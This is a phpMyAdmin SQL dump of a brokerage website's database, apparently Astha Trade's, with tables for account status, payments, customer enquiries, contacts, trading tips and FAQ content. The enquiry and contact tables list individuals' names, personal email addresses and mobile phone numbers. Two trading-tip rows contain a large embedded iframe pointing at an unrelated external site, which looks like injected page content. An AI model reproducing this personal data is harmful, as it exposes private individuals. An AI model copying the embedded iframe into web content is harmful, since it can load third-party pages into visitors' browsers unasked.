-- phpMyAdmin SQL Dump
-- version 4.6.5.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jun 06, 2018 at 09:29 AM
-- Server version: 10.1.21-MariaDB
-- PHP Version: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `wwwastha_cdsl`
--

-- --------------------------------------------------------

--
-- Table structure for table `account_status`
--

CREATE TABLE `account_status` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `ipv_status` int(11) NOT NULL DEFAULT '0' COMMENT '0=not_initiated,1=uploaded,2=verified',
  `form_receive_status` int(11) NOT NULL DEFAULT '0' COMMENT '0=none,1=equity,2=commodity,3=both',
  `kyc_status` int(11) NOT NULL DEFAULT '0',
  `image` text NOT NULL COMMENT 'Path',
  `equity_receive_date` date NOT NULL,
  `commodity_receive_date` date NOT NULL,
  `form_number` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `account_status`
--

INSERT INTO `account_status` (`id`, `user_id`, `ipv_status`, `form_receive_status`, `kyc_status`, `image`, `equity_receive_date`, `commodity_receive_date`, `form_number`) VALUES
(7, 177, 0, 0, 0, '', '0000-00-00', '0000-00-00', 0),
(6, 173, 0, 0, 0, '', '0000-00-00', '0000-00-00', 0),
(5, 175, 1, 0, 0, 'content/images/ipvImages/175.jpg', '0000-00-00', '0000-00-00', 0),
(8, 180, 1, 0, 0, 'content/images/ipvImages/180.png', '0000-00-00', '0000-00-00', 0),
(9, 181, 1, 0, 0, 'content/images/ipvImages/181.png', '0000-00-00', '0000-00-00', 0),
(10, 184, 1, 0, 0, 'content/images/ipvImages/184.png', '0000-00-00', '0000-00-00', 0),
(11, 186, 1, 0, 0, 'content/images/ipvImages/186.png', '0000-00-00', '0000-00-00', 0),
(12, 187, 1, 0, 0, 'content/images/ipvImages/187.png', '0000-00-00', '0000-00-00', 0),
(13, 189, 1, 0, 0, 'content/images/ipvImages/189.png', '0000-00-00', '0000-00-00', 0),
(14, 190, 1, 0, 0, 'content/images/ipvImages/190.png', '0000-00-00', '0000-00-00', 0),
(15, 192, 1, 0, 0, 'content/images/ipvImages/192.png', '0000-00-00', '0000-00-00', 0),
(16, 193, 1, 0, 0, 'content/images/ipvImages/193.png', '0000-00-00', '0000-00-00', 0),
(17, 200, 0, 0, 0, '', '0000-00-00', '0000-00-00', 0),
(18, 201, 0, 0, 0, '', '0000-00-00', '0000-00-00', 0),
(19, 227, 0, 0, 0, '', '0000-00-00', '0000-00-00', 0),
(20, 229, 0, 0, 0, '', '0000-00-00', '0000-00-00', 0),
(1398, 4503, 2, 1, 0, 'content/images/ipvImages/4503.jpg', '2018-06-06', '0000-00-00', 11046),
(1399, 4494, 0, 0, 0, '', '0000-00-00', '0000-00-00', 0),
(1400, 4508, 0, 0, 0, '', '0000-00-00', '0000-00-00', 0);

-- --------------------------------------------------------

--
-- Table structure for table `all_accounts_received`
--

CREATE TABLE `all_accounts_received` (
  `user_id` int(11) NOT NULL,
  `receive_date` date NOT NULL,
  `form_number` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `all_accounts_received`
--

INSERT INTO `all_accounts_received` (`user_id`, `receive_date`, `form_number`) VALUES
(23, '2016-12-30', 10010),
(24, '2016-12-30', 10011),
(26, '2016-12-30', 10012),
(27, '2016-12-31', 10013),
(28, '2016-12-31', 10014),
(31, '2017-01-10', 10015),
(38, '2017-01-10', 10016),
(4491, '2018-06-05', 11044),
(4405, '2018-06-06', 11045),
(4503, '2018-06-06', 11046),
(4373, '2018-06-06', 11047);

-- --------------------------------------------------------

--
-- Table structure for table `live_call`
--

CREATE TABLE `live_call` (
  `id` int(11) NOT NULL,
  `news` varchar(222) NOT NULL,
  `type` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `update_call` text
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `live_call`
--

INSERT INTO `live_call` (`id`, `news`, `type`, `created_at`, `update_call`) VALUES
(3, 'BUY BAJAJ AUTO (NSECASH) ABOVE 2617 TGT 2637 SL 2597.', '2', '2016-12-23 17:17:48', 'BOOK PROFIT IN BAJAJ AUTO AT CMP 2626.'),
(4, '<center><iframe src=\'http://www.radiofama.am\' height=\'820px\' width=\'1100px\' scrolling=\'no\' frameborder=\'0\'></center>', '1', '2016-12-23 18:43:03', '<center><iframe src=\'http://www.radiofama.am\' height=\'820px\' width=\'1100px\' scrolling=\'no\' frameborder=\'0\'></center>'),
(5, 'SELL NIFTY FUT BELOW 7962 TGT 7932 SL 7992.', '4', '2016-12-23 18:53:40', 'SL TRIGGRED IN NIFTY SL CALL.'),
(6, 'BUY NG ABOVE 243 TGT 246 SL 240.', '9', '2016-12-23 19:07:37', ''),
(7, '<center><iframe src=\'http://www.radiofama.am\' height=\'820px\' width=\'1100px\' scrolling=\'no\' frameborder=\'0\'></center>', '1', '2017-01-11 16:30:19', ''),
(8, 'Welcome to Asthatrade', '1', '2017-01-12 11:47:03', 'Welcome to Asthatrade'),
(9, 'Welcome to Asthatrade', '6', '2017-01-12 11:47:19', 'Welcome to Asthatrade'),
(10, 'POSITIONAL CALL: BUY MARTUTI (NSECASH) AT CMP 5780-5782 SL AND TGT TO BE FOLLOW.', '1', '2017-01-12 16:50:29', ''),
(11, 'BUY KOTAK BANK (NSECASH) ABOVE 731.60 TGT 739 SL 725.40.', '1', '2017-01-13 11:24:13', 'SL TRIGGERED IN KOTAK (NSECASH) CALL.'),
(12, 'BUY SJVN (NSECASH) ABOVE 32.80 TGT 34 SL 31.60.', '1', '2017-01-13 12:16:24', ''),
(13, 'BUY VOLTAS FUT ABOVE 342 TGT 344 SL 340.', '2', '2017-01-13 13:32:07', ''),
(14, 'SELL CEAT FUT BELOW 1174 TGT 1164 SL 1184.', '2', '2017-01-13 13:59:18', '');

-- --------------------------------------------------------

--
-- Table structure for table `live_call_category`
--

CREATE TABLE `live_call_category` (
  `id` int(11) NOT NULL,
  `live_call_category_name` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `live_call_category`
--

INSERT INTO `live_call_category` (`id`, `live_call_category_name`) VALUES
(1, 'Stock Cash'),
(2, 'Stock Futures'),
(3, 'Stock Option'),
(4, 'Index Futures'),
(5, 'Index Option'),
(6, 'BTST/STBT'),
(7, 'Bullions'),
(8, 'Base Metals'),
(9, 'Energy');

-- --------------------------------------------------------

--
-- Table structure for table `series`
--

CREATE TABLE `series` (
  `id` int(11) NOT NULL,
  `batchNumber` int(11) NOT NULL,
  `senderReference` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `series`
--

INSERT INTO `series` (`id`, `batchNumber`, `senderReference`) VALUES
(1, 2777, 11047);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_account_pay`
--

CREATE TABLE `tbl_account_pay` (
  `id` int(11) NOT NULL COMMENT 'Auto Increment Id of this Table',
  `user_id` int(11) NOT NULL COMMENT 'User Id',
  `account_type` enum('1','2','3','4') NOT NULL DEFAULT '1' COMMENT '1=Equity,2=Commodity,3=both, 4=Admin',
  `payment_type` enum('1','2','3') NOT NULL DEFAULT '1' COMMENT '1=''Online'', 2=''Offline'', 3=''Admin''',
  `payment_status` enum('0','1','2') NOT NULL DEFAULT '0' COMMENT '0= Not Paid and  1= Paid and 2= For Admin',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'Date of Account Create',
  `pdf_file_path` text NOT NULL COMMENT 'PDF file path'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_account_pay`
--

INSERT INTO `tbl_account_pay` (`id`, `user_id`, `account_type`, `payment_type`, `payment_status`, `created_at`, `pdf_file_path`) VALUES
(1, 1, '4', '3', '2', '2016-12-08 14:00:00', ''),
(2, 2, '1', '1', '0', '2016-12-08 14:00:00', ''),
(3, 3, '2', '2', '0', '2016-12-09 14:00:00', ''),
(4, 3, '1', '2', '0', '2016-12-09 14:00:00', ''),
(5, 4, '1', '2', '0', '2016-12-09 14:00:00', ''),
(6, 4, '2', '2', '0', '2016-12-09 14:00:00', ''),
(7, 2, '2', '2', '1', '2016-12-10 14:00:00', ''),
(8, 8, '1', '1', '0', '2016-12-12 14:00:00', ''),
(10, 9, '1', '2', '0', '2016-12-12 14:00:00', ''),
(11, 9, '2', '1', '0', '2016-12-12 14:00:00', ''),
(12, 10, '2', '1', '0', '2016-12-12 14:00:00', ''),
(13, 8, '2', '2', '0', '2016-12-12 14:00:00', ''),
(14, 11, '2', '1', '0', '2016-12-13 14:00:00', 'account_pdf_files/Devansh_Test_Jain_21122016_Commodity_Form.pdf'),
(15, 11, '1', '2', '0', '2016-12-13 14:00:00', 'account_pdf_files/Devansh_Test_Jain_26122016_Equity_Form.pdf'),
(16, 16, '1', '2', '0', '2016-12-23 14:00:00', 'account_pdf_files/Brajendra_Singh_Bhati_23122016_Equity_Form.pdf'),
(17, 16, '2', '2', '0', '2016-12-23 14:00:00', 'account_pdf_files/Brajendra_Singh_Bhati_23122016_Commodity_Form.pdf'),
(18, 12, '1', '1', '1', '2016-12-23 14:00:00', 'account_pdf_files/AMEY_GUPTA_27122016_Equity_Form.pdf'),
(19, 12, '2', '1', '1', '2016-12-23 14:00:00', ''),
(20, 17, '2', '2', '0', '2016-12-24 14:00:00', ''),
(21, 17, '1', '1', '0', '2016-12-24 14:00:00', ''),
(941, 548, '1', '1', '', '2017-07-23 22:23:35', '');
INSERT INTO `tbl_account_pay` (`id`, `user_id`, `account_type`, `payment_type`, `payment_status`, `created_at`, `pdf_file_path`) VALUES
(942, 548, '2', '1', '', '2017-07-23 22:23:35', ''),
(943, 549, '1', '1', '', '2017-07-24 00:55:39', ''),
(1889, 1050, '2', '1', '', '2017-12-09 17:15:20', ''),
(1890, 1051, '1', '1', '1', '2017-12-09 17:27:36', ''),
(1891, 1051, '2', '1', '', '2017-12-09 17:27:36', '');
INSERT INTO `tbl_account_pay` (`id`, `user_id`, `account_type`, `payment_type`, `payment_status`, `created_at`, `pdf_file_path`) VALUES
(1892, 1052, '1', '1', '', '2017-12-09 17:44:12', ''),
(1893, 1052, '2', '1', '', '2017-12-09 17:44:12', ''),
(2827, 1532, '2', '1', '1', '2018-01-03 17:50:37', ''),
(2828, 1533, '1', '1', '', '2018-01-03 18:01:00', '');
INSERT INTO `tbl_account_pay` (`id`, `user_id`, `account_type`, `payment_type`, `payment_status`, `created_at`, `pdf_file_path`) VALUES
(2829, 1533, '2', '1', '', '2018-01-03 18:01:00', ''),
(2830, 1534, '1', '1', '1', '2018-01-03 18:36:41', ''),
(2831, 1534, '2', '1', '', '2018-01-03 18:36:41', ''),
(3764, 2001, '1', '1', '', '2018-01-17 11:40:28', ''),
(3765, 2001, '2', '1', '', '2018-01-17 11:40:28', ''),
(3766, 2002, '1', '1', '', '2018-01-17 11:47:22', '');
INSERT INTO `tbl_account_pay` (`id`, `user_id`, `account_type`, `payment_type`, `payment_status`, `created_at`, `pdf_file_path`) VALUES
(3767, 2002, '2', '1', '', '2018-01-17 11:47:22', ''),
(3768, 2003, '1', '1', '', '2018-01-17 12:34:26', ''),
(4702, 2473, '1', '1', '', '2018-03-04 08:50:29', ''),
(4703, 2473, '2', '1', '', '2018-03-04 08:50:29', ''),
(4704, 2474, '1', '1', '', '2018-03-04 09:32:23', '');
INSERT INTO `tbl_account_pay` (`id`, `user_id`, `account_type`, `payment_type`, `payment_status`, `created_at`, `pdf_file_path`) VALUES
(4705, 2474, '2', '1', '', '2018-03-04 09:32:23', ''),
(4706, 2475, '1', '1', '', '2018-03-04 10:15:59', ''),
(5636, 2949, '1', '1', '', '2018-04-03 15:18:11', ''),
(5637, 2949, '2', '1', '', '2018-04-03 15:18:11', ''),
(5638, 2950, '1', '1', '', '2018-04-03 15:30:21', ''),
(5639, 2950, '2', '1', '', '2018-04-03 15:30:21', ''),
(5640, 2951, '1', '1', '', '2018-04-03 16:48:14', ''),
(5641, 2951, '2', '1', '', '2018-04-03 16:48:14', '');
INSERT INTO `tbl_account_pay` (`id`, `user_id`, `account_type`, `payment_type`, `payment_status`, `created_at`, `pdf_file_path`) VALUES
(5642, 2952, '1', '1', '', '2018-04-03 18:22:45', ''),
(5643, 2952, '2', '1', '', '2018-04-03 18:22:45', ''),
(8218, 4506, '1', '1', '', '2018-06-06 05:30:28', ''),
(8219, 4506, '2', '1', '', '2018-06-06 05:30:28', ''),
(8220, 4507, '1', '1', '', '2018-06-06 05:57:40', ''),
(8221, 4507, '2', '1', '', '2018-06-06 05:57:40', ''),
(8222, 4508, '1', '1', '1', '2018-06-06 07:06:50', ''),
(8223, 4508, '2', '1', '', '2018-06-06 07:06:50', '');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_addressproof`
--

CREATE TABLE `tbl_addressproof` (
  `id` int(11) NOT NULL,
  `addressproofdoc` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_addressproof`
--

INSERT INTO `tbl_addressproof` (`id`, `addressproofdoc`) VALUES
(1, 'Passport'),
(2, 'Voter ID Card'),
(3, 'Ration Card'),
(4, 'Registered Lease or Sale Agreement of Residence'),
(5, 'Driving License'),
(6, 'Flat Maintenance bill'),
(7, 'Aadhaar'),
(8, 'Utility bills like Telephone Bill (land line), Electricity bill or Gas bill'),
(9, 'Bank Account Statement/Passbook');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_batchnumber`
--

CREATE TABLE `tbl_batchnumber` (
  `batchnumber` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_batchnumber`
--

INSERT INTO `tbl_batchnumber` (`batchnumber`) VALUES
(2756),
(2756);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_contact`
--

CREATE TABLE `tbl_contact` (
  `id` int(11) NOT NULL,
  `name` varchar(250) NOT NULL,
  `email` varchar(250) NOT NULL,
  `phone` varchar(30) NOT NULL,
  `website` varchar(100) NOT NULL,
  `message` text NOT NULL,
  `status` enum('0','1') NOT NULL DEFAULT '0' COMMENT '0=Not Called, 1 = Called',
  `created` date NOT NULL,
  `modified` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Contact Table';

--
-- Dumping data for table `tbl_contact`
--

INSERT INTO `tbl_contact` (`id`, `name`, `email`, `phone`, `website`, `message`, `status`, `created`, `modified`) VALUES
(1, 'Final test', 'devansh.acs@gmail.com', '7415977333', '', 'a fa fsdf adsf afsfsfasd', '1', '2016-12-17', '0000-00-00'),
(2, 'Mohd shoyeb', 'mohdshoyeb1980@gmail.com', '8896006962', '', 'A/C open', '0', '2017-01-14', '0000-00-00'),
(3, 'Mohd shoyeb', 'mohdshoyeb1980@gmail.com', '8896006962', '', 'A/C open', '0', '2017-01-14', '0000-00-00'),
(4, 'Mohd shoyeb', 'mohdshoyeb1980@gmail.com', '8896006962', '', 'A/C open', '0', '2017-01-14', '0000-00-00'),
(5, 'Vishal Goel', 'Mameya.vishal@gmail.comes', '9045989243', '', 'Account open mcx', '0', '2017-07-21', '0000-00-00');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_countries`
--

CREATE TABLE `tbl_countries` (
  `id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  `has_states` tinyint(1) NOT NULL,
  `has_cities` tinyint(1) NOT NULL,
  `currency_name` varchar(64) DEFAULT NULL,
  `currency_code` varchar(3) DEFAULT NULL,
  `dialing_code` int(8) NOT NULL,
  `iso2_code` varchar(2) NOT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_countries`
--

INSERT INTO `tbl_countries` (`id`, `name`, `has_states`, `has_cities`, `currency_name`, `currency_code`, `dialing_code`, `iso2_code`, `created_at`, `updated_at`) VALUES
(1, 'Afghanistan', 1, 1, 'Afghani', 'AFN', 93, 'AF', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(2, 'Albania', 1, 1, 'Lek', 'ALL', 355, 'AL', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(3, 'Algeria', 1, 1, 'Algerian Dinar', 'DZD', 213, 'DZ', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(4, 'American Samoa', 0, 0, 'US Dollar', 'USD', 1, 'AS', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(5, 'Andorra', 1, 1, 'Euro', 'EUR', 376, 'AD', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(6, 'Angola', 1, 1, 'Kwanza', 'AOA', 244, 'AO', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(7, 'Anguilla', 0, 1, 'East Caribbean Dollar', 'XCD', 1, 'AI', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(8, 'Antigua And Barbuda', 1, 1, 'East Caribbean Dollar', 'XCD', 1, 'AG', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(9, 'Argentina', 1, 1, 'Argentine Peso', 'ARS', 54, 'AR', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(10, 'Armenia', 1, 1, 'Armenian Dram', 'AMD', 374, 'AM', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(11, 'Aruba', 0, 1, 'Aruban Guilder', 'AWG', 297, 'AW', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(12, 'Australia', 1, 1, 'Australian Dollar', 'AUD', 61, 'AU', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(13, 'Austria', 1, 1, 'Euro', 'EUR', 43, 'AT', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(14, 'Azerbaijan', 1, 1, 'Azerbaijanian Manat', 'AZN', 994, 'AZ', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(15, 'Aland Islands', 0, 0, NULL, NULL, 0, 'AX', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(16, 'Bahamas', 1, 1, 'Bahamian Dollar', 'BSD', 1, 'BS', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(17, 'Bahrain', 1, 1, 'Bahraini Dinar', 'BHD', 973, 'BH', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(18, 'Bangladesh', 1, 1, 'Taka', 'BDT', 880, 'BD', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(19, 'Barbados', 1, 1, 'Barbados Dollar', 'BBD', 1, 'BB', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(20, 'Belarus', 1, 1, 'Belarussian Ruble', 'BYR', 375, 'BY', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(21, 'Belgium', 1, 1, 'Euro', 'EUR', 32, 'BE', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(22, 'Belize', 1, 1, 'Belize Dollar', 'BZD', 501, 'BZ', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(23, 'Benin', 1, 1, 'CFA Franc BCEAO', 'XOF', 229, 'BJ', '2007-12-28 17:54:05', '2007-12-28 17:54:05'),
(241, 'Yemen', 1, 1, 'Yemeni Rial', 'YER', 967, 'YE', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(242, 'Zambia', 1, 1, 'Kwacha', 'KWA', 260, 'ZM', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(243, 'Zimbabwe', 1, 1, 'Zimbabwe Dollar', 'ZWD', 263, 'ZW', '2007-12-28 17:54:06', '2007-12-28 17:54:06'),
(244, 'Fictitious', 0, 0, '', '', 888, '', '0000-00-00 00:00:00', '0000-00-00 00:00:00'),
(245, 'Fictitious 01', 0, 0, '', '', 0, 'ff', '2013-04-04 12:32:22', '2013-04-04 12:32:22'),
(246, 'Fictitious 02', 0, 0, '', '', 0, 'ff', '2013-04-04 12:33:13', '2013-04-04 12:33:13');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_enquiry`
--

CREATE TABLE `tbl_enquiry` (
  `id` int(11) NOT NULL,
  `fname` varchar(250) NOT NULL,
  `lname` varchar(250) DEFAULT NULL,
  `email` varchar(250) NOT NULL,
  `mobile_no` varchar(30) NOT NULL,
  `enquiry_date` datetime NOT NULL COMMENT 'Created DateTime',
  `modified_date` datetime NOT NULL COMMENT 'Modified DateTime',
  `is_called` enum('1','2') DEFAULT '1' COMMENT '1=not called, 2= called'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_enquiry`
--

INSERT INTO `tbl_enquiry` (`id`, `fname`, `lname`, `email`, `mobile_no`, `enquiry_date`, `modified_date`, `is_called`) VALUES
(1, 'Final test', 'undefined', 'devansh.acs@gmail.com', '7415977333', '2016-12-17 00:00:00', '0000-00-00 00:00:00', '2'),
(2, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(3, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(4, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(5, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(6, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(7, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(8, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(9, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(10, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(11, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(12, 'brajendra singh', 'undefined', 'brajendra.bhati@asthatrade.com', '8435001551', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(13, 'Test From GFS', 'undefined', 'manish500@gmail.com', '8981295907', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(14, 'Manish Bera', 'undefined', 'manish500@gmail.com', '8981295907', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(15, 'Manish', 'undefined', 'manish500@gmail.com', '8981295907', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(16, 'Manish', 'undefined', 'manish500@gmail.com', '8981295907', '2016-12-20 00:00:00', '0000-00-00 00:00:00', '1'),
(17, 'jitendra', 'undefined', 'jitendrajaiswal542@gmail.com', '7415290079', '2016-12-21 00:00:00', '0000-00-00 00:00:00', '1'),
(18, 'jitendra', 'undefined', 'jitendrajaiswal542@gmail.com', '7415290079', '2016-12-21 00:00:00', '0000-00-00 00:00:00', '1'),
(19, 'jitendra', 'undefined', 'jitendrajaiswal542@gmail.com', '7415290079', '2016-12-21 00:00:00', '0000-00-00 00:00:00', '1'),
(20, 'jitendra', 'undefined', 'jitendrajaiswal542@gmail.com', '7415290079', '2016-12-21 00:00:00', '0000-00-00 00:00:00', '1'),
(21, 'Brajendra', 'undefined', 'brajendra.bhati@asthatrade.com', '8889485566', '2016-12-21 00:00:00', '0000-00-00 00:00:00', '1'),
(22, 'Laxman rawat', 'undefined', 'rawatlaxman088@gmail.com', '9752579000', '2016-12-30 00:00:00', '0000-00-00 00:00:00', '1'),
(192, '', '', '', '', '2017-07-27 20:55:02', '2017-07-27 20:55:02', '1'),
(193, 'mritunjay kumar singh', 'undefined', 'mritunjays483@gmail.com', '8076811157', '2017-07-27 20:57:43', '2017-07-27 20:57:43', '1'),
(194, '', '', '', '', '2017-12-04 07:26:01', '2017-12-04 07:26:01', '1'),
(195, '', '', '', '', '2018-03-22 21:30:58', '2018-03-22 21:30:58', '1'),
(196, '', '', '', '', '2018-06-06 05:41:15', '2018-06-06 05:41:15', '1');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_faq`
--

CREATE TABLE `tbl_faq` (
  `id` int(11) NOT NULL,
  `faq_category_id` int(11) NOT NULL,
  `faq_question` varchar(1000) NOT NULL,
  `faq_answer` text NOT NULL,
  `faq_created_date` date NOT NULL,
  `faq_modify_date` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_faq`
--

INSERT INTO `tbl_faq` (`id`, `faq_category_id`, `faq_question`, `faq_answer`, `faq_created_date`, `faq_modify_date`) VALUES
(1, 1, 'How To Download & Install Odin Diet Trading Software?', '<p>OdinDiet Trading Software :- <a href=\"https://asthatrade.bitrix24.com/~bPZXw\" target=\"_blank\">Download </a></p></br>\r\n<p>OdinDiet Shortkut key :- <a href=\"https://asthatrade.bitrix24.com/~luY6G\" target=\"_blank\">Download </a></p></br>\r\n<p> <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/t19C2tBx8fI\" frameborder=\"1\" allowfullscreen></iframe></p></br>\r\n<p> <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/gqNsM-mqxjo\" frameborder=\"0\" allowfullscreen></iframe></p></br>\r\n<p>  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/NE_k_bYMSew\" frameborder=\"0\" allowfullscreen></iframe></p></br>\r\n<p>  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/xmzH2MErGvs\" frameborder=\"0\" allowfullscreen></iframe></p></br>\r\n<p>  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/Tsk1yns3UCM\" frameborder=\"0\" allowfullscreen></iframe></p>', '2016-11-19', '2017-01-27'),
(2, 1, 'How To Operate Net Net(Web Based) Software?', '<p>Net Net Software :- <a href=\"http://odin.asthatrade.com/netnet/\" target=\"_blank\">Click here </a></p> </br>\r\n<p><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ovGCxb0ogtY\" frameborder=\"0\" allowfullscreen></iframe></p>', '2016-11-19', '2016-11-22'),
(3, 1, 'How To Download & Install NOW Trading Software?', '<p>NOW Software :- <a href=\"https://asthatrade.bitrix24.com/~84Otr\" target=\"_blank\">Download </a></p></br>\r\n<p><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/oil1Vu--sAY\" frameborder=\"0\" allowfullscreen></iframe></p>', '2016-11-19', '2016-11-22'),
(4, 1, 'How To Download & Install IWIN(Mobile) App Trading Software?', '<p>Mobile App(IWIN) Guidline :- <img src=\"<?php echo base_url();?>content/images/MT1.jpg\" alt=\"\" ><img src=\"images/MT2.jpg\" alt=\"\" ><img src=\"images/MT3.jpg\" alt=\"\" > </p>', '2016-11-19', '2016-11-22'),
(5, 1, 'How To Operate Backoffice for Ledger and Contract Note ?', '<p><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/98QJdqL7Vxg\" frameborder=\"0\" allowfullscreen></iframe></p>', '2016-11-19', '2016-11-19'),
(6, 2, 'How to Download OdinDiet Registry File ?', '<p>32Bit Odin Registry File :- <a href=\"https://asthatrade.bitrix24.com/~iCQsW\" target=\"_blank\">Download </a></p></br>\r\n<p>64Bit Odin Registry File :- <a href=\"https://asthatrade.bitrix24.com/~OKO6m\" target=\"_blank\">Download </a></p></br>', '2016-11-19', '2016-11-22'),
(7, 3, 'How to Download Remot Desktop ?', '<p>Ammyy Admin :- <a href=\"https://asthatrade.bitrix24.com/~ZSGrb\" target=\"_blank\">Download </a></p></br>\r\n<p>AnyDesk :- <a href=\"https://asthatrade.bitrix24.com/~ZSGrb\" target=\"_blank\">Download </a></p></br>\r\n<p>AeroAdmin :- <a href=\"https://asthatrade.bitrix24.com/~c2ivL\" target=\"_blank\">Download </a></p></br>\r\n<p>Supremo :- <a href=\"https://asthatrade.bitrix24.com/~TeMHF\" target=\"_blank\">Download </a></p>', '2016-11-19', '2016-11-22'),
(8, 4, 'Why join Astha Trade?', '<p>A: We are one of the leading brokerage houses in the country offering low brokerage and bottommost margin. We provide free trading software & our support system will make your trading effortless.</p>', '2016-11-19', '2016-11-19'),
(9, 4, 'What are the segments available at Astha Trade?', '<p>A: We provide trading in:</p>\r\n<p>§ NSE Future & Options</p>\r\n<p>§ NSE Cash </p>\r\n<p>§ MCX Commodity</p>', '2016-11-19', '2016-11-22'),
(10, 4, 'What are the different types of accounts for trading?', '<p>A: For F&amp;O only trading account is required, for equity trading Demat is also required &amp; for commodity only commodity trading account is required.</p>', '2016-11-19', '2016-11-19'),
